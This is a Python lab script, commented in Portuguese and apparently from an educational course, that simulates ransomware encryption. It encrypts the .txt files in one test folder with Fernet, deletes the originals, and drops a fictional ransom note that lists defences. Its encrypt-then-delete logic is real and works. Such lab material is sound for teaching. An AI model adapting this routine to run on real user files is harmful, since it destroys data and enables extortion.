#!/usr/bin/env python3
"""
encriptador.py
Simula a fase de CIFRAGEM de um ransomware — fins EXCLUSIVAMENTE EDUCACIONAIS.

Mecanismo: criptografia simétrica Fernet (AES-128-CBC + HMAC-SHA256).
Escopo   : APENAS a pasta arquivos_teste/ dentro deste projeto.
Chave    : gerada localmente e salva em chave_laboratorio.key (nunca enviar ao repo).

Uso:
    python3 ransomware_simulado/encriptador.py

O que acontece:
  1. Gera (ou reutiliza) uma chave Fernet local.
  2. Cifra cada arquivo .txt em arquivos_teste/ → <nome>.txt.enc
  3. Remove o arquivo original (dentro da pasta de teste somente).
  4. Cria a nota de resgate fictícia LEIA-ME-RANSOMWARE.txt.

⚠️ USO RESTRITO AO LABORATÓRIO. Nunca execute em pastas com dados reais.
"""
import sys
from pathlib import Path

try:
    from cryptography.fernet import Fernet
except ImportError:
    sys.exit("Instale a dependência:  pip install cryptography")

RAIZ = Path(__file__).resolve().parent.parent
PASTA_TESTE = RAIZ / "arquivos_teste"
ARQUIVO_CHAVE = RAIZ / "chave_laboratorio.key"
NOTA_RESGATE = PASTA_TESTE / "LEIA-ME-RANSOMWARE.txt"

NOTA_TEXTO = """\
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!   SIMULAÇÃO EDUCACIONAL DE RANSOMWARE      !!!
!!!   (Esta nota é FICTÍCIA — laboratório DIO) !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Seus arquivos foram CIFRADOS como parte de uma simulação didática.
Em um ataque real, o atacante exigiria pagamento para fornecer a chave.

Para RESTAURAR os arquivos (nesta simulação):
  python3 ransomware_simulado/decriptador.py

O QUE APRENDER COM ISSO:
  - Ransomware real usa cifragem assimétrica (chave pública/privada).
  - A chave privada fica com o atacante — sem pagamento, sem recuperação.
  - Backups offline e segmentação de rede são as principais defesas.
  - Nunca pague o resgate: não há garantia de recuperação.

Consulte docs/ para as estratégias de defesa completas.
"""


def gerar_ou_carregar_chave() -> bytes:
    if ARQUIVO_CHAVE.exists():
        print(f"[*] Reutilizando chave existente: {ARQUIVO_CHAVE.name}")
        return ARQUIVO_CHAVE.read_bytes()
    chave = Fernet.generate_key()
    ARQUIVO_CHAVE.write_bytes(chave)
    print(f"[*] Nova chave gerada e salva em: {ARQUIVO_CHAVE.name}")
    print("    (Nunca envie este arquivo ao repositório — está no .gitignore)")
    return chave


def validar_escopo() -> None:
    """Aborta se a pasta de teste não existir ou parecer suspeita."""
    if not PASTA_TESTE.exists():
        sys.exit(
            f"[ABORTADO] Pasta de teste não encontrada: {PASTA_TESTE}\n"
            "Execute criador_arquivos_teste.py primeiro."
        )
    # Garante que a pasta está DENTRO do projeto (evita path traversal acidental)
    try:
        PASTA_TESTE.resolve().relative_to(RAIZ.resolve())
    except ValueError:
        sys.exit("[ABORTADO] Pasta de teste fora do diretório do projeto.")


def cifrar_arquivos(fernet: Fernet) -> int:
    alvos = list(PASTA_TESTE.glob("*.txt"))
    # Nunca cifrar a nota de resgate em si (se já existir)
    alvos = [a for a in alvos if a.name != NOTA_RESGATE.name]

    if not alvos:
        print("[AVISO] Nenhum arquivo .txt encontrado em arquivos_teste/.")
        print("        Execute criador_arquivos_teste.py primeiro.")
        return 0

    print(f"[*] Cifrando {len(alvos)} arquivo(s) em {PASTA_TESTE.name}/\n")
    for alvo in alvos:
        dados = alvo.read_bytes()
        cifrado = fernet.encrypt(dados)
        destino = alvo.with_suffix(alvo.suffix + ".enc")
        destino.write_bytes(cifrado)
        alvo.unlink()  # Remove o original (dentro da pasta de teste)
        print(f"    [+] {alvo.name}  →  {destino.name}")

    return len(alvos)


def criar_nota() -> None:
    NOTA_RESGATE.write_text(NOTA_TEXTO, encoding="utf-8")
    print(f"\n[*] Nota de resgate criada: {NOTA_RESGATE.name}")


def main() -> None:
    print("=" * 60)
    print("  SIMULAÇÃO EDUCACIONAL — FASE DE CIFRAGEM (RANSOMWARE)")
    print("=" * 60)
    print(f"  Escopo: {PASTA_TESTE}")
    print("  ⚠️  Apenas arquivos FICTÍCIOS de laboratório serão cifrados.")
    print("=" * 60 + "\n")

    validar_escopo()
    chave = gerar_ou_carregar_chave()
    fernet = Fernet(chave)
    total = cifrar_arquivos(fernet)

    if total:
        criar_nota()
        print(f"\n[OK] {total} arquivo(s) cifrado(s).")
        print("     Para descriptografar: python3 ransomware_simulado/decriptador.py")
        print("     Para analisar: compare o .txt original (removido) com o .enc gerado.")


if __name__ == "__main__":
    main()
